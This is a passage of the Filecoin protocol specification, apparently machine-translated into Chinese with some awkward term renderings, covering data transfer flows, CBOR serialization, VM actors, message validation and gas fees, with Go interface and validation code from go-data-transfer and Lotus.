。\n2.2.3Filecoin中的数据传输\n的数据传输协议是用于传输的全部或一部分的协议Piece跨越网络时处理是制成。数据传输模块的总体目标是使其成为底层传输介质的抽象，通过该底层传输介质在Filecoin网络中不同各方之间传输数据。当前，用于实际进行数据传输的底层介质或协议是GraphSync。这样，可以将数据传输协议视为协商协议。\n数据传输协议既用于存储又用于检索交易。在这两种情况下，数据传输请求都是由客户端发起的。这样做的主要原因是，客户端通常比NAT落后很多，因此从其端开始任何数据传输更加方便。对于存储交易，数据传输请求将作为推送请求启动，以将数据发送到存储提供商。在“检索交易”的情况下，数据传输请求作为拉取请求启动，以由存储提供商检索数据。\n发起数据传输的请求包括凭证或令牌（不要与付款渠道凭证混淆），该凭证或令牌指向双方之前已达成的特定交易。这样一来，存储提供商便可以识别请求并将其链接到已同意的交易，而不会忽略该请求。如下所述，检索交易的情况可能略有不同，在此情况下，交易提议和数据传输请求都可以一次发送。\n2.2.3.1模组\n该图显示了数据传输及其模块如何与存储和检索市场相匹配。特别要注意，如何将来自市场的数据传输请求验证器插入“数据传输”模块，但其代码属于市场系统。\n\n2.2.3.2术语\n\n推送请求：将数据发送给另一方的请求-通常由客户端发起，主要是在发生存储交易的情况下。\n提取请求：请求对方发送数据的请求-通常由客户发起，主要是在“检索交易”的情况下。\n请求者：发起数据传输请求的一方（无论是推还是拉）-通常至少在Filecoin中当前实现的客户端，以克服NAT遍历问题。\n响应者：接收数据传输请求的一方-通常是存储提供者。\n数据传输凭证或令牌：围绕存储或检索相关数据的包装，可以识别和验证向另一方的传输请求。\n请求验证器：仅当响应者可以验证请求是否直接绑定到现有存储或检索交易时，数据传输模块才启动传输。验证不由数据传输模块本身执行。取而代之的是，请求验证器检查数据传输凭单以确定是否响应请求或不理会请求。\n运输者：协商和确认请求后，实际的转移由双方的运输者管理。传输器是数据传输模块的一部分，但与协商过程隔离。它可以访问基础可验证的传输协议，并使用它来发送数据和跟踪进度。\n订户：一个外部组件，通过订阅数据传输事件（例如进度或完成）来监视数据传输的进度。\nGraphSync：传输程序使用的默认基础传输协议。完整的graphsync规范可在此处找到\n\n2.2.3.3请求阶段\n任何数据传输都有两个基本阶段：\n\n协商：请求者和响应者通过使用数据传输凭证验证传输来同意传输。\n传输：协商阶段完成后，实际上就传输了数据。用于进行传输的默认协议是Graphsync。\n\n请注意，“协商”和“转移”阶段可以发生在单独的往返行程中，也可能在相同的往返行程中发生，其中请求方通过发送请求隐式地同意，而响应方可以同意并立即发送或接收数据。该过程是在一次还是多次往返中进行，部分取决于请求是推式请求（存储交易）还是拉取请求（检索交易），以及数据传输协商过程是否能够执行回到底层的运输机制上。在使用GraphSync作为传输机制的情况下，可以使用GraphSync的内置可扩展性将数据传输请求作为对GraphSync协议 的扩展。因此，拉取请求仅需要一次往返。但是，由于Graphsync是不直接支持push类型请求的请求/响应协议，因此在Push情况下，协商是通过数据传输自身的libp2p协议在单独的请求中进行的/fil/datatransfer/1.0.0。其他未来的运输机制可能会同时处理“推”和“推”，也可能不会一次处理。接收到数据传输请求后，数据传输模块会对凭证进行解码，并将其交付给请求验证器。在存储交易中，请求验证程序检查所包含的交易是否是收件人之前已经同意的交易。对于检索交易，请求包括有关检索交易本身的建议。只要请求验证者接受交易建议，所有操作都将作为一次往返立即完成。\n值得注意的是，在取回的情况下，提供者可以接受交易和数据传输请求，但是可以暂停取回本身以执行启封过程。在开始实际的数据传输之前，存储提供商必须解封所有请求的数据。此外，存储提供商可以选择在开始开封过程之前暂停检索流程，以请求开封付款请求。存储供应商可以选择要求支付这笔款项，以支付不可思议的计算成本，并避免成为行为不端的客户的受害者。\n2.2.3.4 流程示例\n2.2.3.4.1 推流\n\n\n当请求者想要将数据发送给另一方时，它会发起“推”传输。\n请求者的数据传输模块将把推送请求与数据传输凭证一起发送给响应者。\n响应者的数据传输模块通过验证器验证数据传输请求，该验证器是响应者提供的依赖项。\n响应者的数据传输模块通过发出GraphSync请求来启动传输。\n请求者接收GraphSync请求，验证它是否识别出数据传输并开始发送数据。\n响应者接收数据并可以产生进度指示。\n响应者完成接收数据，并通知所有侦听器。\n\n推送流程非常适合存储交易，在存储交易中，一旦提供者表明他们打算接受并发布客户的交易建议，客户便会立即启动数据传输。\n2.2.3.5 拉流-单程往返\n\n2.2.3.6协议\n可以通过数据传输协议（libp2p协议类型）在网络上协商数据传输。\n使用数据传输协议作为独立的libp2p通讯机制并不是硬性要求-只要双方都实现了可以与对方通信的数据传输子系统，任何传输机制（包括离线机制）都是可以接受的。\n2.2.3.7 数据结构\n示例：数据传输类型\npackage datatransfer\n \nimport (\n\t&quot;fmt&quot;\n \n\t&quot;github.com/ipfs/go-cid&quot;\n\t&quot;github.com/ipld/go-ipld-prime&quot;\n\t&quot;github.com/libp2p/go-libp2p-core/peer&quot;\n \n\t&quot;github.com/filecoin-project/go-data-transfer/encoding&quot;\n)\n \n//go:generate cbor-gen-for ChannelID\n \n// TypeIdentifier is a unique string identifier for a type of encodable object in a\n// registry\ntype TypeIdentifier string\n \n// EmptyTypeIdentifier means there is no voucher present\nconst EmptyTypeIdentifier = TypeIdentifier(&quot;&quot;)\n \n// Registerable is a type of object in a registry. It must be encodable and must\n// have a single method that uniquely identifies its type\ntype Registerable interface {\n\tencoding.Encodable\n\t// Type is a unique string identifier for this voucher type\n\tType() TypeIdentifier\n}\n \n// Voucher is used to validate\n// a data transfer request against the underlying storage or retrieval deal\n// that precipitated it. The only requirement is a voucher can read and write\n// from bytes, and has a string identifier type\ntype Voucher Registerable\n \n// VoucherResult is used to provide option additional information about a\n// voucher being rejected or accepted\ntype VoucherResult Registerable\n \n// TransferID is an identifier for a data transfer, shared between\n// request/responder and unique to the requester\ntype TransferID uint64\n \n// ChannelID is a unique identifier for a channel, distinct by both the other\n// party&#039;s peer ID + the transfer ID\ntype ChannelID struct {\n\tInitiator peer.ID\n\tResponder peer.ID\n\tID        TransferID\n}\n \nfunc (c ChannelID) String() string {\n\treturn fmt.Sprintf(&quot;%s-%s-%d&quot;, c.Initiator, c.Responder, c.ID)\n}\n \n// OtherParty returns the peer on the other side of the request, depending\n// on whether this peer is the initiator or responder\nfunc (c ChannelID) OtherParty(thisPeer peer.ID) peer.ID {\n\tif thisPeer == c.Initiator {\n\t\treturn c.Responder\n\t}\n\treturn c.Initiator\n}\n \n// Channel represents all the parameters for a single data transfer\ntype Channel interface {\n\t// TransferID returns the transfer id for this channel\n\tTransferID() TransferID\n \n\t// BaseCID returns the CID that is at the root of this data transfer\n\tBaseCID() cid.Cid\n \n\t// Selector returns the IPLD selector for this data transfer (represented as\n\t// an IPLD node)\n\tSelector() ipld.Node\n \n\t// Voucher returns the voucher for this data transfer\n\tVoucher() Voucher\n \n\t// Sender returns the peer id for the node that is sending data\n\tSender() peer.ID\n \n\t// Recipient returns the peer id for the node that is receiving data\n\tRecipient() peer.ID\n \n\t// TotalSize returns the total size for the data being transferred\n\tTotalSize() uint64\n \n\t// IsPull returns whether this is a pull request\n\tIsPull() bool\n \n\t// ChannelID returns the ChannelID for this request\n\tChannelID() ChannelID\n \n\t// OtherPeer returns the counter party peer for this channel\n\tOtherPeer() peer.ID\n}\n \n// ChannelState is channel parameters plus it&#039;s current state\ntype ChannelState interface {\n\tChannel\n \n\t// SelfPeer returns the peer this channel belongs to\n\tSelfPeer() peer.ID\n \n\t// Status is the current status of this channel\n\tStatus() Status\n \n\t// Sent returns the number of bytes sent\n\tSent() uint64\n \n\t// Received returns the number of bytes received\n\tReceived() uint64\n \n\t// Message offers additional information about the current status\n\tMessage() string\n \n\t// Vouchers returns all vouchers sent on this channel\n\tVouchers() []Voucher\n \n\t// VoucherResults are results of vouchers sent on the channel\n\tVoucherResults() []VoucherResult\n \n\t// LastVoucher returns the last voucher sent on the channel\n\tLastVoucher() Voucher\n \n\t// LastVoucherResult returns the last voucher result sent on the channel\n\tLastVoucherResult() VoucherResult\n \n\t// ReceivedCids returns the cids received so far on the channel\n\tReceivedCids() []cid.Cid\n \n\t// Queued returns the number of bytes read from the node and queued for sending\n\tQueued() uint64\n}\n示例：数据传输状态\npackage datatransfer\n \n// Status is the status of transfer for a given channel\ntype Status uint64\n \nconst (\n\t// Requested means a data transfer was requested by has not yet been approved\n\tRequested Status = iota\n \n\t// Ongoing means the data transfer is in progress\n\tOngoing\n \n\t// TransferFinished indicates the initiator is done sending/receiving\n\t// data but is awaiting confirmation from the responder\n\tTransferFinished\n \n\t// ResponderCompleted indicates the initiator received a message from the\n\t// responder that it&#039;s completed\n\tResponderCompleted\n \n\t// Finalizing means the responder is awaiting a final message from the initator to\n\t// consider the transfer done\n\tFinalizing\n \n\t// Completing just means we have some final cleanup for a completed request\n\tCompleting\n \n\t// Completed means the data transfer is completed successfully\n\tCompleted\n \n\t// Failing just means we have some final cleanup for a failed request\n\tFailing\n \n\t// Failed means the data transfer failed\n\tFailed\n \n\t// Cancelling just means we have some final cleanup for a cancelled request\n\tCancelling\n \n\t// Cancelled means the data transfer ended prematurely\n\tCancelled\n \n\t// InitiatorPaused means the data sender has paused the channel (only the sender can unpause this)\n\tInitiatorPaused\n \n\t// ResponderPaused means the data receiver has paused the channel (only the receiver can unpause this)\n\tResponderPaused\n \n\t// BothPaused means both sender and receiver have paused the channel seperately (both must unpause)\n\tBothPaused\n \n\t// ResponderFinalizing is a unique state where the responder is awaiting a final voucher\n\tResponderFinalizing\n \n\t// ResponderFinalizingTransferFinished is a unique state where the responder is awaiting a final voucher\n\t// and we have received all data\n\tResponderFinalizingTransferFinished\n \n\t// ChannelNotFoundError means the searched for data transfer does not exist\n\tChannelNotFoundError\n)\n \n// Statuses are human readable names for data transfer states\nvar Statuses = map[Status]string{\n\t// Requested means a data transfer was requested by has not yet been approved\n\tRequested:                           &quot;Requested&quot;,\n\tOngoing:                             &quot;Ongoing&quot;,\n\tTransferFinished:                    &quot;TransferFinished&quot;,\n\tResponderCompleted:                  &quot;ResponderCompleted&quot;,\n\tFinalizing:                          &quot;Finalizing&quot;,\n\tCompleting:                          &quot;Completing&quot;,\n\tCompleted:                           &quot;Completed&quot;,\n\tFailing:                             &quot;Failing&quot;,\n\tFailed:                              &quot;Failed&quot;,\n\tCancelling:                          &quot;Cancelling&quot;,\n\tCancelled:                           &quot;Cancelled&quot;,\n\tInitiatorPaused:                     &quot;InitiatorPaused&quot;,\n\tResponderPaused:                     &quot;ResponderPaused&quot;,\n\tBothPaused:                          &quot;BothPaused&quot;,\n\tResponderFinalizing:                 &quot;ResponderFinalizing&quot;,\n\tResponderFinalizingTransferFinished: &quot;ResponderFinalizingTransferFinished&quot;,\n\tChannelNotFoundError:                &quot;ChannelNotFoundError&quot;,\n}\n示例：数据传输管理器\n管理器是数据传输子系统的所有实现所呈现的核心接口\ntype Manager interface {\n \n\t// Start initializes data transfer processing\n\tStart(ctx context.Context) error\n \n\t// OnReady registers a listener for when the data transfer comes on line\n\tOnReady(ReadyFunc)\n \n\t// Stop terminates all data transfers and ends processing\n\tStop(ctx context.Context) error\n \n\t// RegisterVoucherType registers a validator for the given voucher type\n\t// will error if voucher type does not implement voucher\n\t// or if there is a voucher type registered with an identical identifier\n\tRegisterVoucherType(voucherType Voucher, validator RequestValidator) error\n \n\t// RegisterRevalidator registers a revalidator for the given voucher type\n\t// Note: this is the voucher type used to revalidate. It can share a name\n\t// with the initial validator type and CAN be the same type, or a different type.\n\t// The revalidator can simply be the sampe as the original request validator,\n\t// or a different validator that satisfies the revalidator interface.\n\tRegisterRevalidator(voucherType Voucher, revalidator Revalidator) error\n \n\t// RegisterVoucherResultType allows deserialization of a voucher result,\n\t// so that a listener can read the metadata\n\tRegisterVoucherResultType(resultType VoucherResult) error\n \n\t// RegisterTransportConfigurer registers the given transport configurer to be run on requests with the given voucher\n\t// type\n\tRegisterTransportConfigurer(voucherType Voucher, configurer TransportConfigurer) error\n \n\t// open a data transfer that will send data to the recipient peer and\n\t// transfer parts of the piece that match the selector\n\tOpenPushDataChannel(ctx context.Context, to peer.ID, voucher Voucher, baseCid cid.Cid, selector ipld.Node) (ChannelID, error)\n \n\t// open a data transfer that will request data from the sending peer and\n\t// transfer parts of the piece that match the selector\n\tOpenPullDataChannel(ctx context.Context, to peer.ID, voucher Voucher, baseCid cid.Cid, selector ipld.Node) (ChannelID, error)\n \n\t// send an intermediate voucher as needed when the receiver sends a request for revalidation\n\tSendVoucher(ctx context.Context, chid ChannelID, voucher Voucher) error\n \n\t// close an open channel (effectively a cancel)\n\tCloseDataTransferChannel(ctx context.Context, chid ChannelID) error\n \n\t// pause a data transfer channel (only allowed if transport supports it)\n\tPauseDataTransferChannel(ctx context.Context, chid ChannelID) error\n \n\t// resume a data transfer channel (only allowed if transport supports it)\n\tResumeDataTransferChannel(ctx context.Context, chid ChannelID) error\n \n\t// get status of a transfer\n\tTransferChannelStatus(ctx context.Context, x ChannelID) Status\n \n\t// get notified when certain types of events happen\n\tSubscribeToEvents(subscriber Subscriber) Unsubscribe\n \n\t// get all in progress transfers\n\tInProgressChannels(ctx context.Context) (map[ChannelID]ChannelState, error)\n \n\t// RestartDataTransferChannel restarts an existing data transfer channel\n\tRestartDataTransferChannel(ctx context.Context, chid ChannelID) error\n}\n2.2.4数据格式和序列化\nFilecoin试图利用所需的数据格式更少，并采用规范化的序列化规则，以通过简单性提高协议安全性，并实现Filecoin协议实现之间的互操作性。\n在此处了解有关CBOR使用情况和 Filecoin中的int类型的更多设计注意 事项。\n2.2.4.1资料格式\nFilecoin内存中的数据类型通常很简单。实现应支持两种整数类型：Int（表示本机64位整数）和BigInt（表示任意长度），并避免处理浮点数以最大程度地减少跨编程语言和实现的互操作性问题。\n您还可以在Filecoin协议中阅读有关数据格式的更多 信息，作为随机性生成的一部分。\n2.2.4.2序列化\nSerializationFilecoin中的数据可确保用于序列化内存中数据的一致格式，以进行传输和存储中传输。序列化对于Filecoin协议实现之间的协议安全性和互操作性至关重要，从而可以跨Filecoin节点进行一致的状态更新。\nFilecoin中的所有数据结构都是 CBOR元组编码的。也就是说，在Filecoin系统中使用的任何数据结构（本规范中的结构）都应按声明顺序序列化为CBOR数组，并带有与数据结构字段相对应的项。\n你可以找到在CBOR主要数据类型的编码结构 在这里。\n为了说明起见，内存映射将以按预定顺序列出的键和值的CBOR数组表示。序列化格式的近期更新将涉及适当地标记字段，以确保随着协议的发展而进行适当的序列化/反序列化。\n2.3虚拟机\nFilecoin区块链中的Actor等同于以太坊虚拟机中的智能合约。\nFilecoin虚拟机（VM）是负责执行所有参与者代码的系统组件。在Filecoin VM上执行参与者（即链上执行）会产生汽油费用。\n在Filecoin VM上应用（即执行）的任何操作都将以状态树的形式产生输出（如下所述）。最新的状态树是Filecoin区块链中当前的真相来源。该国树是由CID，其存储在IPLD店鉴定。\n2.3.1VM Actor接口\n如上所述，Actor是以太坊虚拟机中智能合约的Filecoin等效项。因此，Actor是系统的核心组件。Filecoin区块链当前状态的任何更改都必须通过参与者方法调用来触发。\n本小节描述Actor与Filecoin虚拟机之间的接口。这意味着下面描述的大多数内容并不严格属于VM。相反，逻辑位于VM和Actors逻辑之间的接口上。\n总共共有十一（11）种类型的内置Actor，但并非所有类型都与VM交互。一些Actor不会调用对区块链的StateTree的更改，因此不需要与VM的接口。我们稍后将在“系统参与者”小节中讨论所有系统参与者的详细信息。\n该演员地址是通过散列发送者的公钥和创建随机数生成稳定的地址。在整个链重组中应该保持稳定。该演员ID地址，另一方面，是紧凑的，但可以在链重新组织的情况下更改自动递增地址。话虽如此，演员创建后应该使用演员地址。\n例：\npackage builtin\n \nimport (\n\taddr &quot;github.com/filecoin-project/go-address&quot;\n)\n \n// Addresses for singleton system actors.\nvar (\n\t// Distinguished AccountActor that is the source of system implicit messages.\n\tSystemActorAddr           = mustMakeAddress(0)\n\tInitActorAddr             = mustMakeAddress(1)\n\tRewardActorAddr           = mustMakeAddress(2)\n\tCronActorAddr             = mustMakeAddress(3)\n\tStoragePowerActorAddr     = mustMakeAddress(4)\n\tStorageMarketActorAddr    = mustMakeAddress(5)\n\tVerifiedRegistryActorAddr = mustMakeAddress(6)\n\t// Distinguished AccountActor that is the destination of all burnt funds.\n\tBurntFundsActorAddr = mustMakeAddress(99)\n)\n \nconst FirstNonSingletonActorId = 100\n \nfunc mustMakeAddress(id uint64) addr.Address {\n\taddress, err := addr.NewIDAddress(id)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn address\n}\n该ActorState结构由参与者的余额（根据该参与者持有的令牌）以及一组用于查询，检查链状态并与之交互的状态方法组成。\n2.3.2状态树\n状态树是对Filecoin区块链应用的任何操作的执行输出。链上（即VM）状态数据结构是将地址绑定到参与者状态的映射（以散列阵列映射Trie-HAMT的形式）。VM在每次执行actor方法时都会调用当前的State Tree函数。\n示例：StateTree\nStateTree存储参与者的ID。\ntype StateTree struct {\n\troot        adt.Map\n\tversion     types.StateTreeVersion\n\tinfo        cid.Cid\n\tStore       cbor.IpldStore\n\tlookupIDFun func(address.Address) (address.Address, error)\n \n\tsnaps *stateSnaps\n}\n2.3.3VM消息-Actor方法调用\n消息是两个参与者之间进行通信的单位，因此是状态变化的根本原因。一条消息结合了：\n\n从发送方转移到接收方的令牌金额，以及\n具有在接收方上调用的参数的方法（可选/在适用的情况下）。\n\n演员代码可以在处理收到的消息时向其他演员发送其他消息。消息是同步处理的，也就是说，参与者在恢复控制之前等待发送的消息完成。\n消息的处理消耗了计算和存储单位，两者均以gas表示。消息的气体限制为处理该消息提供了所需的计算上限。消息的发件人以其确定的汽油价格来支付消息执行所消耗的气体单位（包括所有嵌套的消息）。区块生产者选择要包含在区块中的消息，并根据每个消息的汽油价格和消耗量获得奖励，从而形成市场。\n2.3.3.1消息语法验证\n语法无效的消息不得传输，保留在消息池中或包含在块中。如果收到无效消息，则应将其丢弃，并且不要进一步传播。\n当单独发送时（在包含在块中之前）SignedMessage，无论使用哪种签名方案，都将消息打包为 。有效的签名邮件的序列化总大小不大于message.MessageMaxSize。\ntype SignedMessage struct {\n\tMessage   Message\n\tSignature crypto.Signature\n}\n语法上有效的UnsignedMessage：\n\n具有格式正确的非空To地址，\n具有格式正确的非空From地址，\n具有Value不小于零且不大于令牌总供给（2e9 * 1e18），并且\n具有非负数GasPrice，\n具有GasLimit至少等于与消息的序列化字节关联的气体消耗的值，\n具有GasLimit不大于区块气体限制网络参数的值。\n\ntype Message struct {\n\t// Version of this message (has to be non-negative)\n\tVersion uint64\n \n\t// Address of the receiving actor.\n\tTo   address.Address\n\t// Address of the sending actor.\n\tFrom address.Address\n \n\tCallSeqNum uint64\n \n\t// Value to transfer from sender&#039;s to receiver&#039;s balance.\n\tValue BigInt\n \n\t// GasPrice is a Gas-to-FIL cost\n\tGasPrice BigInt\n\t// Maximum Gas to be spent on the processing of this message\n\tGasLimit int64\n \n\t// Optional method to invoke on receiver, zero for a plain value transfer.\n\tMethod abi.MethodNum\n\t//Serialized parameters to the method.\n\tParams []byte\n}\n应该有几个功能可以从中提取信息Message struct，例如发件人和收件人地址，要转移的值，执行消息所需的资金以及消息的CID。\n假定消息最终应包含在一个块中并添加到区块链中，则应检查消息的发送者和接收者的消息有效性，该值（应为非负值，并且始终小于循环供应），天然气价格（该价格又应为非负数）且BlockGasLimit该价格不应大于该区块的天然气限额。\n2.3.3.2消息语义验证\n语义验证是指需要消息本身之外的信息的验证。\n语义上有效的SignedMessage必须带有签名，该签名可验证有效载荷是否已被From地址标识的帐户执行者的公钥签名。请注意，当From地址是ID地址时，必须在块所标识的父状态下的发送帐户参与者的状态下查找公钥。\n注意：发送方必须以包含消息的块所标识的父级状态存在。这意味着单个块包含创建新帐户actor的消息和来自同一actor的消息是无效的。来自该参与者的第一条消息必须等到下一个纪元。消息池可能会排除来自参与者的，尚未处于链状状态的消息。\n消息没有进一步的语义验证，可能导致包含该消息的块无效。每个语法有效且正确签名的消息都可以包含在一个块中，并会从执行中产生一个收据。其中MessageReceipt sturct包括以下内容：\ntype MessageReceipt struct {\n\tExitCode exitcode.ExitCode\n\tReturn   []byte\n\tGasUsed  int64\n}\n但是，消息可能无法执行到完成，在这种情况下，它不会触发所需的状态更改。\n这种“无消息语义验证”策略的原因是，在消息作为提示集的一部分执行之前，将不知道消息将应用于的状态。块生产者不知道在提示集中是否有另一个块会在它之前，因此从声明的父状态更改了该块消息将应用到的状态。\n例：\npackage types\n \nimport (\n\t&quot;bytes&quot;\n\t&quot;encoding/json&quot;\n\t&quot;fmt&quot;\n \n\t&quot;github.com/filecoin-project/go-state-types/abi&quot;\n\t&quot;github.com/filecoin-project/go-state-types/big&quot;\n\t&quot;github.com/filecoin-project/lotus/build&quot;\n\tblock &quot;github.com/ipfs/go-block-format&quot;\n\t&quot;github.com/ipfs/go-cid&quot;\n\txerrors &quot;golang.org/x/xerrors&quot;\n \n\t&quot;github.com/filecoin-project/go-address&quot;\n)\n \nconst MessageVersion = 0\n \ntype ChainMsg interface {\n\tCid() cid.Cid\n\tVMMessage() *Message\n\tToStorageBlock() (block.Block, error)\n\t// FIXME: This is the *message* length, this name is misleading.\n\tChainLength() int\n}\n \ntype Message struct {\n\tVersion uint64\n \n\tTo   address.Address\n\tFrom address.Address\n \n\tNonce uint64\n \n\tValue abi.TokenAmount\n \n\tGasLimit   int64\n\tGasFeeCap  abi.TokenAmount\n\tGasPremium abi.TokenAmount\n \n\tMethod abi.MethodNum\n\tParams []byte\n}\n \nfunc (m *Message) Caller() address.Address {\n\treturn m.From\n}\n \nfunc (m *Message) Receiver() address.Address {\n\treturn m.To\n}\n \nfunc (m *Message) ValueReceived() abi.TokenAmount {\n\treturn m.Value\n}\n \nfunc DecodeMessage(b []byte) (*Message, error) {\n\tvar msg Message\n\tif err := msg.UnmarshalCBOR(bytes.NewReader(b)); err != nil {\n\t\treturn nil, err\n\t}\n \n\tif msg.Version != MessageVersion {\n\t\treturn nil, fmt.Errorf(&quot;decoded message had incorrect version (%d)&quot;, msg.Version)\n\t}\n \n\treturn &amp;msg, nil\n}\n \nfunc (m *Message) Serialize() ([]byte, error) {\n\tbuf := new(bytes.Buffer)\n\tif err := m.MarshalCBOR(buf); err != nil {\n\t\treturn nil, err\n\t}\n\treturn buf.Bytes(), nil\n}\n \nfunc (m *Message) ChainLength() int {\n\tser, err := m.Serialize()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn len(ser)\n}\n \nfunc (m *Message) ToStorageBlock() (block.Block, error) {\n\tdata, err := m.Serialize()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n \n\tc, err := abi.CidBuilder.Sum(data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n \n\treturn block.NewBlockWithCid(data, c)\n}\n \nfunc (m *Message) Cid() cid.Cid {\n\tb, err := m.ToStorageBlock()\n\tif err != nil {\n\t\tpanic(fmt.Sprintf(&quot;failed to marshal message: %s&quot;, err)) // I think this is maybe sketchy, what happens if we try to serialize a message with an undefined address in it?\n\t}\n \n\treturn b.Cid()\n}\n \ntype mCid struct {\n\t*RawMessage\n\tCID cid.Cid\n}\n \ntype RawMessage Message\n \nfunc (m *Message) MarshalJSON() ([]byte, error) {\n\treturn json.Marshal(&amp;mCid{\n\t\tRawMessage: (*RawMessage)(m),\n\t\tCID:        m.Cid(),\n\t})\n}\n \nfunc (m *Message) RequiredFunds() BigInt {\n\treturn BigMul(m.GasFeeCap, NewInt(uint64(m.GasLimit)))\n}\n \nfunc (m *Message) VMMessage() *Message {\n\treturn m\n}\n \nfunc (m *Message) Equals(o *Message) bool {\n\treturn m.Cid() == o.Cid()\n}\n \nfunc (m *Message) EqualCall(o *Message) bool {\n\tm1 := *m\n\tm2 := *o\n \n\tm1.GasLimit, m2.GasLimit = 0, 0\n\tm1.GasFeeCap, m2.GasFeeCap = big.Zero(), big.Zero()\n\tm1.GasPremium, m2.GasPremium = big.Zero(), big.Zero()\n \n\treturn (&amp;m1).Equals(&amp;m2)\n}\n \nfunc (m *Message) ValidForBlockInclusion(minGas int64) error {\n\tif m.Version != 0 {\n\t\treturn xerrors.New(&quot;&#039;Version&#039; unsupported&quot;)\n\t}\n \n\tif m.To == address.Undef {\n\t\treturn xerrors.New(&quot;&#039;To&#039; address cannot be empty&quot;)\n\t}\n \n\tif m.From == address.Undef {\n\t\treturn xerrors.New(&quot;&#039;From&#039; address cannot be empty&quot;)\n\t}\n \n\tif m.Value.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; cannot be nil&quot;)\n\t}\n \n\tif m.Value.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.Value.GreaterThan(TotalFilecoinInt) {\n\t\treturn xerrors.New(&quot;&#039;Value&#039; field cannot be greater than total filecoin supply&quot;)\n\t}\n \n\tif m.GasFeeCap.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; cannot be nil&quot;)\n\t}\n \n\tif m.GasFeeCap.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.GasPremium.Int == nil {\n\t\treturn xerrors.New(&quot;&#039;GasPremium&#039; cannot be nil&quot;)\n\t}\n \n\tif m.GasPremium.LessThan(big.Zero()) {\n\t\treturn xerrors.New(&quot;&#039;GasPremium&#039; field cannot be negative&quot;)\n\t}\n \n\tif m.GasPremium.GreaterThan(m.GasFeeCap) {\n\t\treturn xerrors.New(&quot;&#039;GasFeeCap&#039; less than &#039;GasPremium&#039;&quot;)\n\t}\n \n\tif m.GasLimit &gt; build.BlockGasLimit {\n\t\treturn xerrors.New(&quot;&#039;GasLimit&#039; field cannot be greater than a block&#039;s gas limit&quot;)\n\t}\n \n\t// since prices might vary with time, this is technically semantic validation\n\tif m.GasLimit &lt; minGas {\n\t\treturn xerrors.Errorf(&quot;&#039;GasLimit&#039; field cannot be less than the cost of storing a message on chain %d &lt; %d&quot;, m.GasLimit, minGas)\n\t}\n \n\treturn nil\n}\n \nconst TestGasLimit = 100e6\n2.3.4VM运行时环境（在VM内部）\n2.3.4.1收据\n甲MessageReceipt包含一个顶层消息执行的结果。每个语法有效且正确签名的消息都可以包含在一个块中，并会从执行中产生一个收据。\n语法有效的收据具有：\n\n一个非负ExitCode，\nReturn仅当退出代码为零时，才为非空值；并且\n非负数GasUsed。\n\ntype MessageReceipt struct {\n\tExitCode exitcode.ExitCode\n\tReturn   []byte\n\tGasUsed  int64\n}\n2.3.4.2vm/runtime 演员界面\n演员接口的实现可以在这里找到\n2.3.4.3vm/runtime 虚拟机实施\nFilecoin虚拟机运行时的Lotus实现可在此处找到\n2.3.4.4退出码\n有一些由不同参与者共享的常见运行时退出代码。它们的定义可以在这里找到 。\n2.3.5煤气费\n2.3.5.1概要\n与许多区块链的传统情况一样，Gas是衡量链上消息操作要执行多少消耗的存储和/或计算资源的度量单位。在较高级别上，它的工作方式如下：消息发送者指定他们愿意支付的最高金额，以便消息被执行并包含在块中。这是根据总的天然气单位数（GasLimit）（通常期望高于实际GasUsed单位）和每单位天然气的价格（或费用GasFeeCap）来指定的。\n传统上，GasUsed * GasFeeCap去生产矿工作为奖励。该产品的结果被视为消息包含的优先费用，也就是说，消息以降序排列，而消息最高的消息GasUsed * GasFeeCap被优先考虑，因为它们会向矿工返回更多的利润。\n但是，已经观察到，GasUsed * GasFee出于一些原因，这种（支付）策略对于块生产矿工是有问题的。首先，一个生产区块的矿工可能免费包含一条非常昂贵的消息（就所需的链资源而言），在这种情况下，链本身需要承担成本。其次，消息发送者可以任意设置高价，但对于低成本消息（同样以链资源而言），这会导致DoS漏洞。\n为了克服这种情况，Filecoin区块链定义了一个BaseFee，每个消息都会对其进行刻录。理由是，考虑到天然气是衡量链上资源消耗的一种手段，与将其奖励给矿工相比，将其燃烧是有意义的。这样，避免了来自矿工的费用操纵。它BaseFee是动态的，会根据网络拥塞情况自动调整。这一事实使网络可以抵御垃圾邮件攻击。鉴于在SPAM攻击期间网络负载会增加，因此，攻击者无法将SPAM消息的完整块长时间保留BaseFee。\n最后，GasPremium是发件人包括的优先费，以激励矿工选择最有利可图的消息。换句话说，如果消息发件人希望更快地包含其消息，则可以设置更高的GasPremium。\n2.3.5.2参量\n\nGasUsed是执行一条消息所消耗的资源（或气体单位）数量的度量。每种气体单位都以attoFIL进行测量，因此GasUsed是代表能耗单位的数字。GasUsed与消息是正确执行还是失败无关。\nBaseFee是每次执行消息时要燃烧（发送到不可恢复的地址）的每单位天然气的设定价格（以attoFIL /天然气单位计量）。的值BaseFee是动态的，并根据当前的网络拥塞参数进行调整。例如，当网络超出5B气体限制使用量时，BaseFee增加，而当气体限制使用量下降到5B以下时，情况相反。的BaseFee施加到每个块应被包括在块本身。应该有可能BaseFee从链的顶部获得电流值。的BaseFee每单位适用GasUsed，因此，气体的总量烧制的消息是BaseFee * GasUsed。请注意，BaseFee每条消息都会产生，但是同一块中所有消息的值都相同。\nGasLimit以气体为单位进行测量，并由消息发送者设置。它对应允许消息执行在链上消耗的气体量（即气体单位数）施加了硬性限制。消息触发的每个基本操作都会消耗气体，而消息用尽的消息将失败。当消息失败时，由于执行此消息而对状态进行的所有修改都将恢复为先前的状态。与消息执行是否成功无关，矿工将获得他们执行消息所消耗的资源的奖励（见GasPremium下文）。\nGasFeeCap是消息发件人愿意为每单位天然气支付的最高价格（以attoFIL / gas单位衡量）。再加上GasLimit，则GasFeeCap是设置一个发件人将一个消息FIL支付的最高金额：发件人是保证信息绝不会令他们超过GasLimit * GasFeeCapattoFIL（不包括任何溢价，该信息包含其收件人）。\nGasPremium是消息发送者愿意支付的每单位天然气价格（以attoFIL / gas计量）（在顶部BaseFee）以“提示”将包含该消息的矿工。一条消息通常可以GasLimit * 